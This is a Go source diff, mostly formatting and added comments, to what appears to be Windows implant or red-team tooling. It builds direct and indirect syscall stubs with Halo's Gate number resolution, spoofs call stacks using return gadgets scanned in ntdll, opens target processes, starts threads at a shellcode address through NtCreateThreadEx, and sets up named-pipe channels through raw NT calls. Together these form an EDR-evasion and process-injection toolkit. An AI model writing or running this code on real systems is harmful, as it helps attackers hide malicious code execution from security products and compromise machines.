@@ -34,10 +34,10 @@ func (sm *syscallManager) getStub(funcName string) (uintptr, error) {
 		}
 	}
 	code := []byte{
-		0x4C, 0x8B, 0xD1,                                               // mov r10, rcx
+		0x4C, 0x8B, 0xD1, // mov r10, rcx
 		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24), // mov eax, SSN
-		0x0F, 0x05,                                                     // syscall
-		0xC3,                                                           // ret
+		0x0F, 0x05, // syscall
+		0xC3, // ret
 	}
 	addr, err := allocateLocalRX(code)
 	if err != nil {
@@ -88,7 +88,7 @@ func (sm *syscallManager) getSpoofedStub(funcName string) (uintptr, error) {
 	code = append(code, 0x48, 0xB8) // mov rax, imm64
 	code = append(code, byte(fakeRet), byte(fakeRet>>8), byte(fakeRet>>16), byte(fakeRet>>24),
 		byte(fakeRet>>32), byte(fakeRet>>40), byte(fakeRet>>48), byte(fakeRet>>56))
-	code = append(code, 0x50) // push rax
+	code = append(code, 0x50)             // push rax
 	code = append(code, 0x4C, 0x8B, 0xD1) // mov r10, rcx
 	code = append(code, 0xB8,
 		byte(ssn), byte(ssn>>8), byte(ssn>>16), byte(ssn>>24)) // mov eax, SSN
@@ -154,6 +154,7 @@ func findRetGadget() (uintptr, error) {
 	}
 	base := hMod
 
+	// Parse ntdll PE headers to locate .text section for gadget scanning
 	dos := (*imageDOSHeader)(unsafe.Pointer(base))
 	if dos.eMagic != 0x5A4D {
 		return 0, fmt.Errorf("invalid DOS header")
@@ -164,8 +165,10 @@ func findRetGadget() (uintptr, error) {
 	}
 
 	ntHdrOffset := uintptr(dos.eLfanew)
+	// Map first section header: located after optional header in NT headers
 	firstSection := (*imageSectionHeader)(unsafe.Pointer(base + ntHdrOffset + uintptr(unsafe.Offsetof(ntHdr.optionalHeader)) + uintptr(ntHdr.fileHeader.sizeOfOptionalHeader)))
 
+	// Iterate section headers to find .text section for ret gadget
 	for i := uint16(0); i < ntHdr.fileHeader.numberOfSections; i++ {
 		sec := (*imageSectionHeader)(unsafe.Pointer(uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})))
 		name := string(sec.name[:])
@@ -178,6 +181,7 @@ func findRetGadget() (uintptr, error) {
 			if size > 1024*1024 {
 				size = 1024 * 1024
 			}
+			// Map .text section as byte array for 0xC3 (ret) instruction scanning
 			text := (*[1 << 20]byte)(unsafe.Pointer(start))[:size]
 			// Search for 0xC3 (ret) at a >= 4 byte aligned offset
 			for i := 8; i < len(text)-1; i++ {
@@ -206,6 +210,7 @@ func findSyscallNumHalo(funcName string) (uint32, error) {
 	}
 	base := hMod
 
+	// Parse ntdll PE to resolve export and extract syscall number
 	dos := (*imageDOSHeader)(unsafe.Pointer(base))
 	if dos.eMagic != 0x5A4D {
 		return 0, fmt.Errorf("invalid DOS header")
@@ -218,6 +223,7 @@ func findSyscallNumHalo(funcName string) (uint32, error) {
 	if exportDir.virtualAddress == 0 {
 		return 0, fmt.Errorf("no export directory")
 	}
+	// Map export directory and arrays for function name lookup
 	exp := (*imageExportDirectory)(unsafe.Pointer(base + uintptr(exportDir.virtualAddress)))
 
 	funcArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfFunctions)))
@@ -239,6 +245,7 @@ func findSyscallNumHalo(funcName string) (uint32, error) {
 			funcRVA := funcArray[ord]
 			funcAddr := base + uintptr(funcRVA)
 
+			// Read function prologue: scan for "mov eax, SSN" (0xB8) followed by "syscall; ret" (0x0F 0x05 0xC3)
 			code := (*[64]byte)(unsafe.Pointer(funcAddr))[:]
 			for k := 0; k < len(code)-5; k++ {
 				if code[k] == 0xB8 {
@@ -268,6 +275,7 @@ func findSyscallGadget() (uintptr, error) {
 	}
 	base := hMod
 
+	// Parse ntdll PE to locate "syscall;ret" (0x0F 0x05 0xC3) gadget in .text
 	dos := (*imageDOSHeader)(unsafe.Pointer(base))
 	if dos.eMagic != 0x5A4D {
 		return 0, fmt.Errorf("invalid DOS header")
@@ -318,17 +326,17 @@ func syscallNtCreateThreadEx(sm *syscallManager, hProc uintptr, shellcodeAddr ui
 	var hThread uintptr
 	r1, _, _ := syscall.Syscall12(stub, 11,
 		uintptr(unsafe.Pointer(&hThread)),
-		0x1FFFFF, // DesiredAccess
-		0,        // ObjectAttributes
-		hProc,    // ProcessHandle
+		0x1FFFFF,      // DesiredAccess
+		0,             // ObjectAttributes
+		hProc,         // ProcessHandle
 		shellcodeAddr, // StartAddress
-		0,        // Argument
-		0,        // CreateFlags
-		0,        // ZeroBits
-		0,        // StackSize (default)
-		0,        // MaxStackSize (default)
-		0,        // AttributeList (NULL)
-		0,        // padding
+		0,             // Argument
+		0,             // CreateFlags
+		0,             // ZeroBits
+		0,             // StackSize (default)
+		0,             // MaxStackSize (default)
+		0,             // AttributeList (NULL)
+		0,             // padding
 	)
 	if r1 != 0 {
 		return 0, fmt.Errorf("NtCreateThreadEx failed: 0x%X", r1)
@@ -439,12 +447,12 @@ func syscallNtOpenProcess(sm *syscallManager, desiredAccess uint32, pid uint32) 
 	}
 	var hProc uintptr
 	objAttr := struct {
-		length          uint32
-		rootDirectory   uintptr
-		objectName      uintptr
-		attributes      uint32
-		securityDescr   uintptr
-		securityQoS     uintptr
+		length        uint32
+		rootDirectory uintptr
+		objectName    uintptr
+		attributes    uint32
+		securityDescr uintptr
+		securityQoS   uintptr
 	}{}
 	objAttr.length = uint32(unsafe.Sizeof(objAttr))
 
@@ -549,11 +557,11 @@ type ntUnicodeString struct {
 }
 
 type ntObjectAttributes struct {
-	Length              uint32
-	RootDirectory       uintptr
-	ObjectName          *ntUnicodeString
-	Attributes          uint32
-	SecurityDescriptor  uintptr
+	Length                   uint32
+	RootDirectory            uintptr
+	ObjectName               *ntUnicodeString
+	Attributes               uint32
+	SecurityDescriptor       uintptr
 	SecurityQualityOfService uintptr
 }
 
@@ -582,7 +590,7 @@ func ntBuildPipeName(pipeName string) (*uint16, *ntUnicodeString) {
 func ntBuildObjAttr(pipeName string) (*uint16, *ntUnicodeString, *ntObjectAttributes) {
 	buf, us := ntBuildPipeName(pipeName)
 	oa := &ntObjectAttributes{
-		Length:    uint32(unsafe.Sizeof(ntObjectAttributes{})),
+		Length:     uint32(unsafe.Sizeof(ntObjectAttributes{})),
 		ObjectName: us,
 		Attributes: 0x40, // OBJ_CASE_INSENSITIVE
 	}
@@ -608,20 +616,20 @@ func syscallNtCreateNamedPipeFile(sm *syscallManager, pipeName string, maxInstan
 	var timeout int64 = -5 * 10000000 // 5 seconds in 100ns units, negative = relative
 
 	r1, _, _ := syscall.Syscall15(stub, 14,
-		uintptr(unsafe.Pointer(&handle)),    // FileHandle (out)
-		0xC0000000,                           // DesiredAccess: GENERIC_READ | GENERIC_WRITE
-		uintptr(unsafe.Pointer(oa)),          // ObjectAttributes
-		uintptr(unsafe.Pointer(&iosb)),       // IoStatusBlock (out)
-		3,                                    // ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE
-		3,                                    // CreateDisposition: FILE_OPEN_IF
-		0x20,                                 // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT
-		0,                                    // NamedPipeType: FILE_PIPE_BYTE_STREAM_TYPE
-		0,                                    // ReadMode: FILE_PIPE_BYTE_STREAM_MODE
-		0,                                    // CompletionMode: FILE_PIPE_QUEUE_OPERATION
-		uintptr(maxInstances),                // MaximumInstances
-		4096,                                 // InboundQuota
-		4096,                                 // OutboundQuota
-		uintptr(unsafe.Pointer(&timeout)),    // DefaultTimeout
+		uintptr(unsafe.Pointer(&handle)),  // FileHandle (out)
+		0xC0000000,                        // DesiredAccess: GENERIC_READ | GENERIC_WRITE
+		uintptr(unsafe.Pointer(oa)),       // ObjectAttributes
+		uintptr(unsafe.Pointer(&iosb)),    // IoStatusBlock (out)
+		3,                                 // ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE
+		3,                                 // CreateDisposition: FILE_OPEN_IF
+		0x20,                              // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT
+		0,                                 // NamedPipeType: FILE_PIPE_BYTE_STREAM_TYPE
+		0,                                 // ReadMode: FILE_PIPE_BYTE_STREAM_MODE
+		0,                                 // CompletionMode: FILE_PIPE_QUEUE_OPERATION
+		uintptr(maxInstances),             // MaximumInstances
+		4096,                              // InboundQuota
+		4096,                              // OutboundQuota
+		uintptr(unsafe.Pointer(&timeout)), // DefaultTimeout
 		0,
 	)
 	if r1 != 0 {
@@ -645,12 +653,12 @@ func syscallNtOpenPipe(sm *syscallManager, pipeName string) (uintptr, error) {
 	var handle uintptr
 
 	r1, _, _ := syscall.Syscall6(stub, 6,
-		uintptr(unsafe.Pointer(&handle)),    // FileHandle (out)
-		0xC0000000,                           // DesiredAccess: GENERIC_READ | GENERIC_WRITE
-		uintptr(unsafe.Pointer(oa)),          // ObjectAttributes
-		uintptr(unsafe.Pointer(&iosb)),       // IoStatusBlock (out)
-		3,                                    // ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE
-		0x20,                                 // OpenOptions: FILE_SYNCHRONOUS_IO_NONALERT
+		uintptr(unsafe.Pointer(&handle)), // FileHandle (out)
+		0xC0000000,                       // DesiredAccess: GENERIC_READ | GENERIC_WRITE
+		uintptr(unsafe.Pointer(oa)),      // ObjectAttributes
+		uintptr(unsafe.Pointer(&iosb)),   // IoStatusBlock (out)
+		3,                                // ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE
+		0x20,                             // OpenOptions: FILE_SYNCHRONOUS_IO_NONALERT
 	)
 	if r1 != 0 {
 		return 0, fmt.Errorf("NtOpenFile pipe failed: 0x%X", r1)
@@ -672,16 +680,16 @@ func syscallNtFsControlListen(sm *syscallManager, handle uintptr) error {
 	var iosb ntIoStatusBlock
 
 	r1, _, _ := syscall.Syscall12(stub, 10,
-		handle,                                // FileHandle
-		0,                                     // Event (none, synchronous)
-		0,                                     // ApcRoutine
-		0,                                     // ApcContext
-		uintptr(unsafe.Pointer(&iosb)),        // IoStatusBlock (out)
-		0x110004,                              // FsControlCode: FSCTL_PIPE_LISTEN
-		0,                                     // InputBuffer
-		0,                                     // InputBufferLength
-		0,                                     // OutputBuffer
-		0,                                     // OutputBufferLength
+		handle,                         // FileHandle
+		0,                              // Event (none, synchronous)
+		0,                              // ApcRoutine
+		0,                              // ApcContext
+		uintptr(unsafe.Pointer(&iosb)), // IoStatusBlock (out)
+		0x110004,                       // FsControlCode: FSCTL_PIPE_LISTEN
+		0,                              // InputBuffer
+		0,                              // InputBufferLength
+		0,                              // OutputBuffer
+		0,                              // OutputBufferLength
 		0, 0,
 	)
 	if r1 != 0 && r1 != 0x103 { // STATUS_SUCCESS or STATUS_PENDING
@@ -707,15 +715,15 @@ func syscallNtReadPipe(sm *syscallManager, handle uintptr, buf []byte) (int, err
 	var iosb ntIoStatusBlock
 
 	r1, _, _ := syscall.Syscall9(stub, 9,
-		handle,                                // FileHandle
-		0,                                     // Event
-		0,                                     // ApcRoutine
-		0,                                     // ApcContext
-		uintptr(unsafe.Pointer(&iosb)),        // IoStatusBlock (out)
-		uintptr(unsafe.Pointer(&buf[0])),      // Buffer
-		uintptr(len(buf)),                     // Length
-		0,                                     // ByteOffset (nil for pipes)
-		0,                                     // Key
+		handle,                           // FileHandle
+		0,                                // Event
+		0,                                // ApcRoutine
+		0,                                // ApcContext
+		uintptr(unsafe.Pointer(&iosb)),   // IoStatusBlock (out)
+		uintptr(unsafe.Pointer(&buf[0])), // Buffer
+		uintptr(len(buf)),                // Length
+		0,                                // ByteOffset (nil for pipes)
+		0,                                // Key
 	)
 	if r1 != 0 {
 		return 0, fmt.Errorf("NtReadFile failed: 0x%X", r1)
@@ -740,15 +748,15 @@ func syscallNtWritePipe(sm *syscallManager, handle uintptr, data []byte) (int, e
 	var iosb ntIoStatusBlock
 
 	r1, _, _ := syscall.Syscall9(stub, 9,
-		handle,                                // FileHandle
-		0,                                     // Event
-		0,                                     // ApcRoutine
-		0,                                     // ApcContext
-		uintptr(unsafe.Pointer(&iosb)),        // IoStatusBlock (out)
-		uintptr(unsafe.Pointer(&data[0])),     // Buffer
-		uintptr(len(data)),                    // Length
-		0,                                     // ByteOffset (nil for pipes)
-		0,                                     // Key
+		handle,                            // FileHandle
+		0,                                 // Event
+		0,                                 // ApcRoutine
+		0,                                 // ApcContext
+		uintptr(unsafe.Pointer(&iosb)),    // IoStatusBlock (out)
+		uintptr(unsafe.Pointer(&data[0])), // Buffer
+		uintptr(len(data)),                // Length
+		0,                                 // ByteOffset (nil for pipes)
+		0,                                 // Key
 	)
 	if r1 != 0 {
 		return 0, fmt.Errorf("NtWriteFile failed: 0x%X", r1)
